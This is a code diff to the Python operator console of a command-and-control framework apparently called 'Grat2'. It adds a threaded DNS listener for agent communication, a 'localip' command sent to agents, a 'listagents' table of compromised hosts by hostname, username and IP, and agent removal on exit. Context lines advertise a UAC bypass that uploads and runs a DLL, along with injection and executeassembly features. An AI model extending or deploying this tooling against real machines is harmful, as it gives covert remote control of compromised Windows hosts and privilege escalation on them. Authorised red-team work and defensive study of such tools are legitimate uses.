@@ -6,6 +6,12 @@ import encrypt
 import subprocess
 import re
 import ntpath
+import handlers
+import threading
+import dnslistener
+
+class define_dns_domain():
+    dnsDomainName = ""
 
 # class for agent isolation - see handlers do_GET
 class agent_iso_class():
@@ -45,6 +51,13 @@ class AgentConsole(cmd.Cmd):
     
     def do_exit(self,input):
         send_command.send_cmd = "exit"
+        # POP Agent from Agent List
+        for currentAgent in handlers.listAllAgents:
+            # For loop in the list, and if the first 12 characters equals with the current agent, 
+            # get the element position and pop
+            if currentAgent[0:12] == agent_iso_class.unique_agent_name:
+                AgentPosition = handlers.listAllAgents.index(currentAgent)
+                handlers.listAllAgents.pop(AgentPosition)
         print("Agent Killed!")
         return True
     
@@ -332,7 +345,13 @@ class AgentConsole(cmd.Cmd):
 
     def help_uac_diskcleanup(self):
         print("SilentCleanup Technique. Upload dll into the affected machine and run: e.g uac_diskcleanup c:\\temp\\demo.dll,DLLMain (avoid spaces in the directory path))")
- 
+
+    def do_localip(self,input):
+        send_command.send_cmd = "localip "
+
+    def help_localip(self):
+        print("Get the local IP Address of the machine")
+
 class Console(cmd.Cmd):
     prompt = 'Grat2> '
     intro = 'Type help or ? to list commands.\n'
@@ -344,12 +363,34 @@ class Console(cmd.Cmd):
     def emptyline(self):
         pass
 
+    def do_startdns(self, input):
+        global startListener
+        #define_dns_domain.dnsDomainName = input
+        startListener = threading.Thread(target=dnslistener.StartDNSListener, args=[self])
+        startListener.start()
+        print("DNS Listener Started!")
+        print("*PLEASE NOTE*")
+        print("Injections, executeassembly and Upload (More than 255 Chars) functionalities are not working at the moment.")
+
+    def help_startdns(self):
+        print("Start DNS Listener: startdns <dns server>")
+
     def do_exit(self, input):
         print("Byee!!")
         os._exit(0)
 
     def help_exit(self):
         print('Exit Console!!!')
+
+    def help_listagents(self):
+        print("List Active Agents: listagents")
+
+    def do_listagents(self, input):
+        print("{:17} {:12} {:10} {:12} {:10}".format("Agent Name", "Hostname", "Username", "IP Address", "Listener"))
+        print("===============================================================")
+        for i in handlers.listAllAgents:
+            print(i)
+            print("---------------------------------------------------------------")
 
     def help_interact(self):
         print("Interact with the agent: interact <agent name>")
